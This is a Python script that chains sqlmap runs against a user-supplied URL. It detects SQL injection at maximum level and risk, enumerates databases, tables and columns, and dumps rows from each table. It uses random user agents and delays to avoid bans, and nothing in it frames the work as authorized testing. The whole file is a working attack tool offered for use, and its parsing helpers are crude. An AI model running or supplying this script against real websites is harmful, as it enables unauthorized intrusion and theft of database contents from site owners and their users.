#ULTIMATE SQLMAP SIMPLIFIED AND BETTER THAN HUMAN DONE SCRIPTING !!
#!/usr/bin/env python3
import subprocess
import re
import time

# ========== CONFIGURABLE OPTIONS ==========
MAX_TABLES = 2
MAX_ROWS = 10
THREADS = 5
DELAY = 1  # seconds between steps (to avoid bans)
# ==========================================

def run_sqlmap(args, quiet=False):
    cmd = ["sqlmap"] + args + ["--batch", "--random-agent", f"--threads={THREADS}"]
    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
        if not quiet:
            print(result.stdout)
        return result.stdout
    except KeyboardInterrupt:
        print("\n[!] User interrupted.")
        exit()
    except Exception as e:
        print(f"[!] Error: {e}")
        return ""

def extract_injectable_param(output):
    match = re.findall(r"Parameter: (\w+) \(", output)
    return list(set(match))

def extract_matches(output, keyword):
    matches = re.findall(rf"\[\*\]\s*(\w+)", output)
    return matches

def extract_tables(output):
    return re.findall(r"\|\s*(\w+)\s*\|", output)

def extract_columns(output):
    return re.findall(r"\|\s*(\w+)\s*\|\s*(\w+)", output)

def main():
    url = input("Enter target URL (e.g., https://site.com/page?param=value): ").strip()
    if not url:
        print("[!] URL required.")
        return

    print("\n[+] Step 1: Detecting SQL injection...")
    detect_output = run_sqlmap(["-u", url, "--level=5", "--risk=3"])
    injectable = extract_injectable_param(detect_output)
    if not injectable:
        print("[-] No injectable parameter found.")
        return
    print(f"[✓] Injectable parameter(s): {', '.join(injectable)}")

    time.sleep(DELAY)
    print("\n[+] Step 2: Enumerating databases...")
    db_output = run_sqlmap(["-u", url, "--dbs"], quiet=True)
    databases = extract_matches(db_output, "available databases")
    if not databases:
        print("[-] No databases found.")
        return
    print(f"[✓] Databases: {', '.join(databases)}")

    for db in databases:
        time.sleep(DELAY)
        print(f"\n[+] Step 3: Fetching tables from database '{db}'...")
        table_output = run_sqlmap(["-u", url, "-D", db, "--tables"], quiet=True)
        tables = extract_tables(table_output)
        if not tables:
            print(f"[-] No tables found in {db}")
            continue
        print(f"[✓] Tables: {', '.join(tables[:MAX_TABLES])}")

        for table in tables[:MAX_TABLES]:
            time.sleep(DELAY)
            print(f"\n[+] Step 4: Fetching columns from table '{table}'...")
            col_output = run_sqlmap(["-u", url, "-D", db, "-T", table, "--columns"], quiet=True)
            columns = extract_columns(col_output)
            if not columns:
                print(f"[-] No columns found in table {table}")
                continue
            col_names = [col[0] for col in columns]
            print(f"[✓] Columns: {', '.join(col_names)}")

            time.sleep(DELAY)
            print(f"\n[+] Step 5: Dumping up to {MAX_ROWS} rows from '{table}'...")
            run_sqlmap(["-u", url, "-D", db, "-T", table, "--dump", f"--dump-limit={MAX_ROWS}"])

    print("\n[✓] Done. Injection confirmed and partial data dumped.")

if __name__ == "__main__":
    main()
